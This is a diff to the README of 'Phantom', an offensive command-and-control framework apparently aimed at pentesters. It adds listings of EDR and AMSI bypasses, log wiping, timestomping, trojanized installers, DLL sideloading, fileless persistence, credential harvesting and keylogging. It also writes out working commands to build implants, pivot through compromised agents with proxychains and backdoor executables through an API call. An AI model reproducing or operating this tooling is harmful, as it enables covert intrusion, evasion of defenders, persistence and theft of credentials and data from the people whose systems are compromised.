@@ -72,23 +72,36 @@
 **Interface**
 - **Dual interface** — choose CLI, Web UI, or both on startup
 - **Operator authentication** — first-run setup + masked password login
-- **Web UI dashboard** — Cobalt Strike/Mythic-inspired dark theme with beacon graphs, network topology, agent cards, interactive terminal
+- **Web UI dashboard** — Cobalt Strike/Mythic-inspired with light/dark theme toggle
 - **CLI shell** — styled prompt with session recording and real-time event notifications
+- **Keyboard shortcuts** — Alt+1-9 tab switching, `/` to focus terminal
 
 **Communications**
 - **HTTP/HTTPS/DNS listeners** with malleable communication profiles
 - **Encrypted comms** — RSA-2048 key exchange + AES-256-GCM with auto key rotation
-- **3 malleable profiles** — Default, Microsoft 365, Cloudflare Workers
+- **4 malleable profiles** — Default, Microsoft 365, Cloudflare Workers, Redirector
 - **SMB/Unix socket pivoting** — agent-to-agent relay for lateral access
 - **Mobile endpoint** — `/api/v1/mobile/checkin` for Android/iOS callbacks
+- **Listener presets** — save, load, one-click launch from CLI or Web UI
+- **JA3 fingerprint randomization** — random cipher suites per connection to avoid TLS fingerprinting
+- **User-Agent rotation** — 7 real browser UAs randomly selected per request
+- **Traffic padding** — random-length data padding defeats traffic pattern analysis
+- **Exponential backoff** — failed connections use 2^n retry to avoid flooding detection
 
 **Evasion & Stealth**
 - **AMSI bypass** — patches AmsiScanBuffer
 - **ETW bypass** — patches EtwEventWrite
 - **ntdll unhooking** — loads clean .text from disk
 - **Process hollowing** — CreateProcess suspended + QueueUserAPC
+- **Sleep encryption** — Ekko-style memory encryption during sleep (defeats BeaconEye, YARA)
+- **Indirect syscalls** — Halo's Gate SSN resolution to bypass EDR hooks
+- **Parent PID spoofing** — spawn processes under explorer.exe/svchost.exe
+- **Stack spoofing framework** — fake call stack during sleep
+- **Timestomping** — modify file timestamps to match reference files
+- **Log cleanup** — clear Windows event logs (Security, System, PowerShell) and Linux syslogs
+- **Self-cleanup** — removes binary and clears environment on kill/kill-date
 - **Sandbox detection** — uptime, CPU, hostname, environment checks
-- **Mobile evasion** — anti-emulator, anti-Frida, anti-debug, anti-AV (25+ packages), sandbox timing delay
+- **Mobile evasion** — anti-emulator, anti-Frida, anti-debug, anti-AV (25+ packages)
 
 **Execution**
 - **In-memory BOF** — COFF parser (Windows), memfd_create (Linux)
@@ -99,36 +112,60 @@
 **Post-Exploitation**
 - **Token manipulation** — steal, make, revert, impersonate
 - **Keylogger** — GetAsyncKeyState (Windows), xinput (Linux)
-- **SOCKS5 proxy** + port forwarding — pivot through agents
+- **C2-tunneled SOCKS5 proxy** — runs on operator's machine, proxychains-compatible
+- **Port forwarding** — forward local ports to remote targets through agents
 - **Credential harvesting** — browser, WiFi, clipboard, SSH, RDP, vault
 - **5 persistence methods** — registry, schtask, cron, systemd, bashrc
 
-**Payload Generation (16+ types)**
+**Payload Generation (26+ types)**
 - **Agent binaries** — Windows EXE, Linux ELF, garble-obfuscated
 - **Web shells** — ASPX, PHP, JSP (token-protected with 404 decoy)
 - **Stagers** — PowerShell, Bash, Python, HTA, VBA macro
 - **Mobile** — Android APK builder (30+ fake app templates), iOS MDM + phishing
-- **Mobile evasion auto-included** — all generated apps bypass security analysis
+- **Binary backdooring** — inject agent into any PE/ELF binary (like Sliver `backdoor`)
+- **DLL sideloading** — proxy DLL for Teams, Slack, Chrome, VSCode, Firefox, PuTTY
+- **LNK shortcut backdoor** — malicious shortcuts with real app icons
+- **Installer wrapper** — trojanized setup that runs agent + real installer
+- **Service DLL** — Windows service under svchost (auto-restart, survives reboot)
+- **WMI event subscription** — fileless persistence (no files on disk)
+- **Office template macro** — VBA in Normal.dotm (runs on every new document)
+- **Registry/scheduled task/startup folder** — multiple persistence generators
+- **Obfuscation options** — None, Strip, or Garble from Web UI
 
-**Web UI**
-- **Authenticated dashboard** — login required, session-based auth
-- **Payload generator** — build any payload from the browser with auto-download
-- **Beacon graphs** — Cobalt Strike-style activity charts and network topology
-- **Interactive terminal** — send commands to agents from the browser
-- **Multi-operator** — multiple pentesters on same server simultaneously
+**Web UI (Full Feature Parity with CLI)**
+- **Light/dark theme** — toggle with persistence, professional light theme
+- **Bigger sidebar icons** — labeled icons for all tabs
+- **Dashboard** — real-time stats, beacon graphs, network topology, engagement timer
+- **Agent management** — rename agents, delete dead agents, agent cards with status
+- **Listener management** — create, start/stop, save presets, one-click launch
+- **Interactive terminal** — colored output (IPs cyan, errors red, FLAGs gold), command history
+- **Payload generator** — listener/preset dropdown, obfuscation level, auto-download
+- **Backdoor generator** — binary backdoor + 10 persistence types from browser
+- **File browser** — OS-adaptive (dir/ls), clickable folders, Up/Refresh navigation
+- **Credential manager** — add/view/remove harvested credentials with type tagging
+- **Loot viewer** — browse captured output by type (creds, files, screenshots, keylogs)
+- **Pivot map** — canvas network graph showing agents grouped by subnet
+- **IOC dashboard** — tracks files dropped, network connections, processes, persistence
+- **Session replay** — replay any agent's full command history with timestamps
+- **Command templates** — 6 built-in templates (Initial Enum, AD Enum, etc.) with one-click Run All
+- **MITRE ATT&CK mapping** — 16 technique IDs mapped to Phantom commands
+- **Auto-tasks** — configure commands to run automatically on new agent check-in
+- **Operator audit log** — who sent what command to which agent
+- **Engagement notes** — persistent notepad for documenting findings
+- **Browser notifications** — push alerts on new agent check-in
+- **Export data** — download full engagement data as JSON
+- **SOCKS proxy** — start/stop C2-tunneled SOCKS from the terminal tab
+- **Sleep/jitter control** — adjust beacon intervals from the Web UI
+- **Multi-operator** — concurrent CLI + Web UI sessions
 
 **Operations**
-- **Agent notes** — add per-agent notes (creds found, pivot paths, etc.)
-- **Task output search** — search across ALL command output from all agents
-- **File browser** — request directory listings from agents
-- **Screenshot/process viewer** — request captures from agents via Web UI
+- **C2-tunneled SOCKS5** — proxychains-compatible pivoting through agents
+- **Engagement timer** — elapsed time tracking in topbar
 - **Engagement reporting** — Markdown + CSV with full activity timeline
 - **Webhook notifications** — Slack/Discord alerts on events
 - **Session recording** — every command logged for documentation
 - **Built-in diagnostics** — `--doctor` flag checks 25+ system requirements
 - **Redirector support** — generate Nginx/Caddy/Cloudflare/iptables configs
-- **Docker deployment** — `docker-compose up -d` one-liner
-- **Versioning** — CHANGELOG.md, git tags, `--version` flag
 - **Docker deployment** — `docker-compose up -d` one-liner
 
 ---
@@ -411,6 +448,72 @@ make restart
 make agent-windows LISTENER_URL=http://YOUR-IP:8080
 ```
 
+### Building Agents with Embedded RSA Key
+
+For agents to communicate with the C2, the server's RSA public key must be embedded:
+
+```bash
+cd ~/phantom
+SERVER_PUB_DER_B64=$(python3 -c "
+import base64, re
+with open('configs/server.pub','rb') as f: pem = f.read()
+b64 = re.sub(r'-----[^-]+-----', '', pem.decode()).replace('\n','').strip()
+print(base64.b64encode(base64.b64decode(b64)).decode())")
+
+GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags "-s -w \
+  -X 'github.com/phantom-c2/phantom/internal/implant.ListenerURL=http://YOUR-IP:8080' \
+  -X 'github.com/phantom-c2/phantom/internal/implant.SleepSeconds=5' \
+  -X 'github.com/phantom-c2/phantom/internal/implant.JitterPercent=10' \
+  -X 'github.com/phantom-c2/phantom/internal/implant.ServerPubKey=$SERVER_PUB_DER_B64'" \
+  -o build/agents/phantom-agent_linux_amd64 ./cmd/agent
+```
+
+---
+
+## C2-Tunneled SOCKS5 Proxy
+
+Route traffic through compromised agents into internal networks using proxychains:
+
+```bash
+# From Phantom CLI
+phantom > interact <agent>
+phantom [agent] > socks start 1080
+
+# Or from the Web UI: Terminal tab → "SOCKS Proxy" button
+
+# Configure proxychains
+echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf
+
+# Scan internal networks through the agent
+proxychains nmap -sT -Pn 10.10.20.0/24
+
+# SSH to internal hosts
+proxychains ssh admin@10.10.20.10
+
+# Access internal web apps
+proxychains curl http://10.10.20.30:8080
+```
+
+---
+
+## Binary Backdooring
+
+Inject the Phantom agent into any legitimate executable:
+
+```bash
+# From CLI
+phantom > backdoor /path/to/putty.exe http://YOUR-C2:8080
+
+# From Web UI: Payloads tab → Binary Backdoor panel
+
+# From API
+curl -X POST http://localhost:3000/api/payload/backdoor/binary \
+  -H "Content-Type: application/json" \
+  -d '{"input":"/path/to/app.exe","listener_url":"http://YOUR-C2:8080"}'
+```
+
+Supported backdoor types: DLL sideloading, LNK shortcuts, installer wrappers, service DLLs, registry persistence, scheduled tasks, WMI events (fileless), Office templates, startup folder, Linux bashrc.
+
 ---
 
 ## Payload Generation
@@ -576,14 +679,23 @@ All pages and API endpoints are protected — no anonymous access.
 
 ### Web UI Features
 
-- **Dashboard** — real-time stats, beacon activity graph, network topology, agent cards
-- **Agents** — table view with interact buttons, status badges
-- **Terminal** — interactive command terminal with quick-action buttons
-- **Payloads** — generate any payload type from the browser (auto-downloads to your machine)
-- **Listeners** — view running listeners
-- **Tasks** — full task history with output
-- **Events** — event log
-- **Scoreboard** — agent count badges
+- **Dashboard** — real-time stats, beacon graphs, network topology, engagement timer
+- **Agents** — card view + table view, rename agents, delete dead agents
+- **Listeners** — create, start/stop, save presets, one-click launch
+- **Tasks** — full task history with output across all agents
+- **Terminal** — colored output, command history, quick-action buttons, SOCKS proxy, sleep control
+- **Payloads** — generator with listener preset selector, obfuscation options, auto-download
+- **Backdoors** — binary backdoor + 10 persistence types (DLL sideload, WMI, registry, etc.)
+- **Files** — OS-adaptive file browser with clickable folders, screenshot/process viewer
+- **Credentials** — add/view/remove harvested creds with type tagging
+- **Loot** — browse captured output by type (creds, files, screenshots, keylogs)
+- **Pivot Map** — canvas network graph showing agents by subnet
+- **IOC Dashboard** — tracks files, connections, processes, persistence artifacts
+- **Session Replay** — replay any agent's command history with timestamps
+- **Templates** — 6 built-in command templates + MITRE ATT&CK mapping + auto-tasks
+- **Audit** — operator audit log (who sent what to which agent)
+- **Events** — event log + engagement notes
+- **Theme** — light/dark mode toggle with persistence
 
 ### Web UI API Endpoints
 
@@ -593,7 +705,13 @@ All pages and API endpoints are protected — no anonymous access.
 | `/logout` | GET | End session |
 | `/api/agents` | GET | List all agents |
 | `/api/agent/{name}` | GET | Agent detail with task history |
+| `/api/agent/remove` | POST | Delete a dead agent |
+| `/api/agent/rename` | POST | Rename an agent |
 | `/api/listeners` | GET | List all listeners |
+| `/api/listener/create` | POST | Create and start a listener |
+| `/api/listener/start` | GET | Start a stopped listener |
+| `/api/listener/stop` | GET | Stop a running listener |
+| `/api/presets` | GET/POST | Manage listener presets |
 | `/api/tasks` | GET | All tasks across agents |
 | `/api/events` | GET | Event log |
 | `/api/cmd` | POST | Send command to an agent |
@@ -601,6 +719,16 @@ All pages and API endpoints are protected — no anonymous access.
 | `/api/payload/download` | GET | Download generated payload |
 | `/api/payload/types` | GET | List available payload types |
 | `/api/payload/apps` | GET | List mobile app templates |
+| `/api/payload/backdoor` | POST | Generate persistence backdoor |
+| `/api/payload/backdoor/binary` | POST | Backdoor an executable |
+| `/api/payload/backdoor/types` | GET | List backdoor types |
+| `/api/tunnel/start` | POST | Start SOCKS5 tunnel through agent |
+| `/api/tunnel/stop` | GET | Stop SOCKS5 tunnel |
+| `/api/tunnel/list` | GET | List active tunnels |
+| `/api/loot` | GET | Browse all captured loot |
+| `/api/templates` | GET/POST | Command templates CRUD |
+| `/api/autotasks` | GET/POST | Auto-task configuration |
+| `/api/auditlog` | GET | Operator audit log |
 | `/api/notes?agent=` | GET/POST | Read/add agent notes |
 | `/api/search?q=` | GET | Search all task output |
 | `/api/operators` | GET | List online operators |
